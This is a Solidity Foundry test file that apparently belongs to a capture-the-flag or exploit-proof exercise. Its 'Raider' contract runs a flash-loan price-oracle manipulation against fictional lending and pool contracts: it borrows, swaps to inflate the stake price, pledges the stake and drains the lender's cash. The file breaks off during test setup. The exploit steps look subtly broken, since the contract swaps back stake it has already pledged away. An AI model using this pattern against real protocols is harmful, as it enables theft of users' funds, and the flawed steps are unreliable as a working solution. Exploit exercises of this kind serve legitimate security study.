// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {Coin, MirrorPool, QuickLoan, PawnShop} from "@contracts/HallOfMirrors.sol";
import {ExploitProof} from "@proof/ExploitProof.sol";

contract Raider {
    QuickLoan quickLoan;
    MirrorPool mirrorPool;
    PawnShop pawnShop;
    Coin stakeCoin;
    Coin cashCoin;

    constructor(QuickLoan _quickLoan, MirrorPool _mirrorPool, PawnShop _pawnShop, Coin _stakeCoin, Coin _cashCoin) {
        quickLoan = _quickLoan;
        mirrorPool = _mirrorPool;
        pawnShop = _pawnShop;
        stakeCoin = _stakeCoin;
        cashCoin = _cashCoin;
    }

    function attack(uint256 borrowAmount) external {
        quickLoan.borrow(borrowAmount, "");
    }

    function onFlashLoan(uint256 amount, bytes calldata) external {
        // 1. Swap borrowed cash for stake to inflate the stake price in MirrorPool
        cashCoin.approve(address(mirrorPool), amount);
        uint256 stakeReceived = mirrorPool.swapCashForStake(amount);

        // 2. Pledge a tiny/all received stake to PawnShop
        stakeCoin.approve(address(pawnShop), stakeReceived);
        pawnShop.pledge(stakeReceived);

        // 3. Draw out massive cash against the manipulated price
        uint256 maxCashToDraw = cashCoin.balanceOf(address(pawnShop));
        pawnShop.draw(maxCashToDraw);

        // 4. Swap stake back for cash to repay the flash loan
        stakeCoin.approve(address(mirrorPool), stakeReceived);
        mirrorPool.swapStakeForCash(stakeReceived);

        // 5. Repay flash loan
        cashCoin.transfer(address(quickLoan), amount);
    }
}

contract ProveHallOfMirrorsLeadOne is ExploitProof {
    function test_exploit() external {
        Coin stakeCoin = new Coin("Stake");
        Coin cashCoin = new Coin("Cash");

